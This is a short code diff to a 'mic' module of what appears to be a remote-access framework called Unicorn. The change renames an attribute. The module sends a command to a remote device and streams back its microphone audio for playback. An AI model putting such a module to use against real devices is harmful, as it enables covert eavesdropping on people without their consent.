@@ -5,8 +5,8 @@ import pyaudio
 from core.badges import badges
 
 class UnicornModule:
-    def __init__(self, sender):
-        self.sender = sender
+    def __init__(self, unicorn):
+        self.unicorn = unicorn
         self.badges = badges()
 
         self.name = "mic"
@@ -26,16 +26,16 @@ class UnicornModule:
                         rate=RATE,
                         output=True,
                         frames_per_buffer=CHUNK)
-        if self.sender.send_command(self.name) == "success":
+        if self.unicorn.send_command(self.name) == "success":
             print(self.badges.G + "Listening...")
             print(self.badges.I + "Press Ctrl-C to stop.")
             while True:
-                self.sender.send_request("continue", False)
+                self.unicorn.send_request("continue", False)
                 try:
-                    data = self.unicorn.recvall(4096)
+                    data = self.handler.recvall(4096)
                     stream.write(data)
                 except (KeyboardInterrupt, EOFError):
-                    self.sender.send_request("break", False)
+                    self.unicorn.send_request("break", False)
                     stream.stop_stream()
                     stream.close()
                     p.terminate()
